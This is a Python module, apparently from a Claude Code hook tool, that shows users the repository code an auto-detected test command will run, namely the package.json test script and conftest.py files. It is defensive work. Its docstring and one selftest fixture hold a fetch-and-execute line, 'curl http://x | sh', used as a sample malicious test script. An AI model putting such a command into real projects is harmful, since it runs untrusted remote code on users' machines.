#!/usr/bin/env python3
"""Disclose the UNTRUSTED SURFACE an auto-detected test command will execute (#25).

The turn-end gate resolves a test command from the repository's own files and runs it. That is
the right default - opening Claude Code in a directory implies enough trust to run its tests -
but the user never saw what would run. This module is the missing half.

WHY NOT JUST PRINT THE COMMAND. The plan's first wording was "a one-time per-repo notice naming
the exact command". The exact commands are the literal strings `npm test --silent` and
`"<python>" -m pytest -x -q`, and NEITHER NAMES THE UNTRUSTED PART. What actually executes is
the `scripts.test` body in package.json, and the `conftest.py` files pytest imports before it
collects a single test. A notice reading "will run: npm test --silent" is a receipt, not a
disclosure - it satisfies the letter of the requirement while telling the reader nothing they
could act on. This module discloses the BODY.

KEYED ON CONTENT, NOT ON THE PROJECT. Once-per-repo is wrong here for a reason that only shows
up later: a repo that disclosed `jest --ci` on Monday and is edited to `curl … | sh` on Tuesday
would never speak again. The marker key includes a hash of the disclosed text, so changing what
runs re-arms the notice. Changing the WRAPPER does not - that is the same command by any honest
reading, and a notice that fires on correct work gets switched off.

NOT DISCLOSED: `.claude/fast-test.cmd`. The user wrote that file themselves; telling them what
is in it is noise, and noise is how a notice earns a filter.

TWIN-ROSTER RISK, AND WHAT KILLS IT. resolve_with_source() answers "which branch did detect()
take", and any second copy of a resolution order drifts from the first - this repo has been bitten
by exactly that (detect-don't-list). It is not prevented here by care; selftest() asserts the two
agree across a fixture matrix covering every branch, so drift is a RED TEST rather than a habit.

Always exits 0. This is information, never a block.
"""
from __future__ import annotations

import hashlib
import json
import os
import sys
import time

SOURCE_OVERRIDE = "override"
SOURCE_NPM = "npm"
SOURCE_PYTEST = "pytest"
SOURCE_NONE = "none"

# A conftest.py is imported by pytest BEFORE collection, from the rootdir and from each
# directory it descends into. Two levels covers the layouts detect() accepts (root, tests/,
# test/, and a package dir holding colocated tests) without walking a monorepo.
_CONFTEST_DEPTH = 2
_MAX_DISCLOSED_CONFTESTS = 12


def _fast_test():
    """Imported lazily: fast_test_on_stop imports THIS module at its notice call site, and a
    module-scope import in both directions is a circular import at load time."""
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import fast_test_on_stop  # noqa: E402
    return fast_test_on_stop


def resolve_with_source(cwd: str) -> tuple[str | None, str]:
    """(command, source) - the same answer detect() gives, plus WHICH branch produced it.

    Deliberately mirrors detect()'s order rather than string-matching its output: matching on
    `cmd == "npm test --silent"` would silently mis-attribute the moment that literal changed,
    and mis-attribution here means disclosing the wrong file. selftest() pins the agreement.
    """
    ft = _fast_test()
    ov = os.path.join(cwd, ".claude", "fast-test.cmd")
    if os.path.exists(ov):
        cmd, _, _ = ft._read_override(ov)
        if cmd:
            return cmd, SOURCE_OVERRIDE
        # A present-but-empty override is NOT an override; detect() returns its (None, ...)
        # straight out rather than falling through, so this must too or the two disagree.
        return None, SOURCE_NONE
    pj = os.path.join(cwd, "package.json")
    if os.path.exists(pj):
        try:
            with open(pj, encoding="utf-8") as f:
                test = (json.load(f).get("scripts") or {}).get("test", "")
            if test and "no test specified" not in test:
                return "npm test --silent", SOURCE_NPM
        except (OSError, ValueError):
            pass
    if ft.looks_like_pytest_project(cwd) and ft._pytest_importable():
        return f'"{sys.executable}" -m pytest -x -q', SOURCE_PYTEST
    return None, SOURCE_NONE


def _npm_test_body(cwd: str) -> str | None:
    try:
        with open(os.path.join(cwd, "package.json"), encoding="utf-8") as f:
            return ((json.load(f).get("scripts") or {}).get("test") or "").strip() or None
    except (OSError, ValueError):
        return None


def _conftest_paths(cwd: str) -> tuple[list[str], int]:
    """(shown, total) conftest.py files pytest will import here, repo-relative and pruned.

    The first version `break`ed out of the walk at the cap and returned the survivors, which is
    the defect cap_shapes exists to catch - and it caught this, on the first suite run after the
    module was written. In a DISCLOSURE the lie is worse than usual: capping at 12 and printing
    12 would tell a reader those are all the files that will be imported, when the thirteenth is
    exactly the one nobody looked at. The scan now completes and the count is real.
    """
    ft = _fast_test()
    found = []
    base = os.path.abspath(cwd)
    for dirpath, dirnames, filenames in os.walk(base):
        rel = os.path.relpath(dirpath, base)
        depth = 0 if rel == "." else rel.count(os.sep) + 1
        if depth >= _CONFTEST_DEPTH:
            dirnames[:] = []
        dirnames[:] = [d for d in dirnames if d not in ft._PRUNE_DIRS and not d.startswith(".")]
        if "conftest.py" in filenames:
            p = os.path.join(rel, "conftest.py") if rel != "." else "conftest.py"
            found.append(p.replace(os.sep, "/"))
    import capped_report
    shown, total = capped_report.keep(sorted(found), _MAX_DISCLOSED_CONFTESTS)
    return shown, total


def disclosure(cwd: str, source: str) -> list[str]:
    """The lines describing what will ACTUALLY execute. Empty = nothing worth disclosing."""
    if source == SOURCE_NPM:
        body = _npm_test_body(cwd)
        if not body:
            return []
        return ["runs this repo's package.json scripts.test:", "    " + body]
    if source == SOURCE_PYTEST:
        cts, total = _conftest_paths(cwd)
        if not total:
            # A pytest project with no conftest.py still executes this repo's test files. Say so
            # rather than returning nothing, or the notice would go silent on the commonest shape.
            return ["collects and executes this repo's own test files"]
        import capped_report
        return (["imports this repo's conftest.py BEFORE collecting anything:"]
                + capped_report.render(cts, _MAX_DISCLOSED_CONFTESTS, prefix="    ",
                                       noun="conftest.py", total=total))
    return []


def _marker_path(cwd: str, payload: str) -> str:
    ft = _fast_test()
    key = hashlib.sha1(ft._state_key(cwd).encode("utf-8", "surrogateescape")).hexdigest()[:16]
    content = hashlib.sha1(payload.encode("utf-8", "surrogateescape")).hexdigest()[:8]
    return os.path.join(ft.STATE_DIR, "disclose-%s-%s.json" % (key, content))


def notice_once(cwd: str, cmd: str, source: str) -> int:
    """Print the disclosure once per (project, disclosed content). Always returns 0."""
    if source not in (SOURCE_NPM, SOURCE_PYTEST) or not cmd:
        return 0
    lines = disclosure(cwd, source)
    if not lines:
        return 0
    payload = "\n".join(lines)
    mp = _marker_path(cwd, payload)
    if os.path.exists(mp):
        return 0
    ft = _fast_test()
    try:
        os.makedirs(ft.STATE_DIR, exist_ok=True)
        with open(mp, "w", encoding="utf-8") as f:
            json.dump({"ts": time.time(), "cwd": cwd, "cmd": cmd, "source": source,
                       "disclosed": lines}, f)
    except OSError:
        return 0   # cannot record it -> stay silent rather than repeat at every turn end
    name = os.path.basename(cwd.rstrip("/\\")) or cwd
    body = "".join("    %s\n" % ln for ln in lines)
    sys.stderr.write(
        "[fast-test] AUTO-DETECTED a test command in '%s' and will run it at every turn end.\n"
        "    command: %s\n"
        "%s"
        "    This is code from the repository, not from unbluff. To choose what runs, put your\n"
        "    own command in .claude/fast-test.cmd. To run nothing, remove the Stop hook.\n"
        "[fast-test] Said once per project per disclosed command. Delete %s to hear it again.\n"
        % (name, cmd, body, mp))
    return 0


# ---------------------------------------------------------------- selftest

def _mk(tmp: str, rel: str, content: str = "") -> None:
    p = os.path.join(tmp, rel.replace("/", os.sep))
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(content)


def selftest() -> int:
    import tempfile
    ft = _fast_test()
    fails = []
    cases = []          # (label, builder, expected_source)

    cases.append(("bare-dir", lambda d: None, SOURCE_NONE))
    cases.append(("override", lambda d: _mk(d, ".claude/fast-test.cmd", "echo hi\n"),
                  SOURCE_OVERRIDE))
    cases.append(("npm", lambda d: _mk(d, "package.json",
                                       '{"scripts":{"test":"jest --ci"}}'), SOURCE_NPM))
    cases.append(("npm-placeholder", lambda d: _mk(
        d, "package.json", '{"scripts":{"test":"echo \\"Error: no test specified\\" && exit 1"}}'),
        SOURCE_NONE))
    cases.append(("pytest-conftest", lambda d: _mk(d, "conftest.py", "\n"), SOURCE_PYTEST))
    cases.append(("pytest-ini", lambda d: (_mk(d, "pytest.ini", "[pytest]\n"),
                                           _mk(d, "tests/test_a.py", "def test_a(): pass\n")),
                  SOURCE_PYTEST))
    cases.append(("override-beats-npm", lambda d: (_mk(d, ".claude/fast-test.cmd", "echo hi\n"),
                                                   _mk(d, "package.json",
                                                       '{"scripts":{"test":"jest"}}')),
                  SOURCE_OVERRIDE))

    # 1. resolve_with_source AGREES with detect() on every branch. This is the twin-roster pin:
    #    the whole reason a second resolution order is tolerable here.
    for label, build, want_source in cases:
        with tempfile.TemporaryDirectory() as d:
            build(d)
            mine_cmd, mine_src = resolve_with_source(d)
            theirs_cmd, _, _ = ft.detect(d)
            if mine_cmd != theirs_cmd:
                fails.append("%s: resolve_with_source gave %r, detect() gave %r - the two "
                             "resolution orders have DRIFTED" % (label, mine_cmd, theirs_cmd))
            if mine_src != want_source:
                fails.append("%s: source %r, expected %r" % (label, mine_src, want_source))

    # 2. The disclosure names the BODY, not the wrapper. This is the whole point of the module,
    #    so it is asserted directly: a notice that merely repeated the command would pass every
    #    other check here.
    with tempfile.TemporaryDirectory() as d:
        _mk(d, "package.json", '{"scripts":{"test":"jest --ci --runInBand"}}')
        lines = disclosure(d, SOURCE_NPM)
        if not any("jest --ci --runInBand" in ln for ln in lines):
            fails.append("npm disclosure did not contain the scripts.test BODY: %r" % (lines,))
        if any(ln.strip() == "npm test --silent" for ln in lines):
            fails.append("npm disclosure printed the wrapper instead of the body")

    with tempfile.TemporaryDirectory() as d:
        _mk(d, "conftest.py", "\n")
        _mk(d, "tests/conftest.py", "\n")
        lines = disclosure(d, SOURCE_PYTEST)
        if not any(ln.strip() == "conftest.py" for ln in lines):
            fails.append("pytest disclosure omitted the ROOT conftest.py: %r" % (lines,))
        if not any(ln.strip() == "tests/conftest.py" for ln in lines):
            fails.append("pytest disclosure omitted tests/conftest.py: %r" % (lines,))

    # 2b. A CAP MUST ANNOUNCE WHAT IT HID. cap_shapes caught the first version silently
    #     truncating at 12, and in a disclosure that is the worst place to lie: the reader would
    #     take twelve names for the whole list when the thirteenth is the unexamined one.
    with tempfile.TemporaryDirectory() as d:
        n_files = _MAX_DISCLOSED_CONFTESTS + 3
        for i in range(n_files):
            _mk(d, "pkg%02d/conftest.py" % i, "\n")
        shown, total = _conftest_paths(d)
        if total != n_files:
            fails.append("_conftest_paths reported total %d, not the real %d - the scan is "
                         "still stopping at the bound" % (total, n_files))
        if len(shown) != _MAX_DISCLOSED_CONFTESTS:
            fails.append("cap not applied: showed %d" % len(shown))
        lines = disclosure(d, SOURCE_PYTEST)
        if not any("more conftest.py(s) not shown" in ln for ln in lines):
            fails.append("the disclosure capped silently - it must name what it hid: %r"
                         % (lines[-2:],))
        if not any(str(n_files) in ln for ln in lines):
            fails.append("the truncation notice does not carry the REAL total %d" % n_files)

    # 3. An override discloses NOTHING - the user wrote it. A notice here would be noise, and
    #    noise is how a notice gets filtered out.
    with tempfile.TemporaryDirectory() as d:
        _mk(d, ".claude/fast-test.cmd", "echo hi\n")
        if disclosure(d, SOURCE_OVERRIDE):
            fails.append("an override was disclosed; the user wrote that file themselves")

    # 4. THE KEY IS THE CONTENT. Same repo, changed scripts.test -> a DIFFERENT marker, so the
    #    notice speaks again. Without this a repo discloses `jest` once and may then run
    #    anything at all in silence, which is the failure this module exists to prevent.
    with tempfile.TemporaryDirectory() as d:
        _mk(d, "package.json", '{"scripts":{"test":"jest"}}')
        a = _marker_path(d, "\n".join(disclosure(d, SOURCE_NPM)))
        _mk(d, "package.json", '{"scripts":{"test":"curl http://x | sh"}}')
        b = _marker_path(d, "\n".join(disclosure(d, SOURCE_NPM)))
        if a == b:
            fails.append("the marker key did not change when scripts.test changed - a repo "
                         "could silently swap what runs after disclosing once")

    # 5. Fires ONCE, then is silent - measured against the CORRECT case, not only the firing one.
    with tempfile.TemporaryDirectory() as d, tempfile.TemporaryDirectory() as state:
        old = os.environ.get("UNBLUFF_STATE_DIR")
        os.environ["UNBLUFF_STATE_DIR"] = state
        try:
            import importlib
            importlib.reload(ft)
            _mk(d, "package.json", '{"scripts":{"test":"jest"}}')
            cmd, src = resolve_with_source(d)
            first = notice_once(d, cmd, src)
            marker = _marker_path(d, "\n".join(disclosure(d, src)))
            if not os.path.exists(marker):
                fails.append("no marker written, so the notice would repeat at every turn end")
            second = notice_once(d, cmd, src)
            if first != 0 or second != 0:
                fails.append("notice_once returned non-zero; it must never block a turn")
        finally:
            if old is None:
                os.environ.pop("UNBLUFF_STATE_DIR", None)
            else:
                os.environ["UNBLUFF_STATE_DIR"] = old
            importlib.reload(ft)

    print("-- fast-test disclosure: %d resolution branch(es) pinned against detect(), "
          "body-not-wrapper asserted for npm and pytest, content-keyed marker verified"
          % len(cases))
    if fails:
        for f in fails:
            print("FAIL: %s" % f)
        return 1
    print("SELFTEST OK")
    return 0


def main() -> int:
    if "--selftest" in sys.argv:
        return selftest()
    cwd = os.getcwd()
    cmd, source = resolve_with_source(cwd)
    print("cwd    : %s" % cwd)
    print("command: %s" % (cmd or "(none detected)"))
    print("source : %s" % source)
    for ln in disclosure(cwd, source):
        print("  %s" % ln)
    return 0


if __name__ == "__main__":
    sys.exit(main())
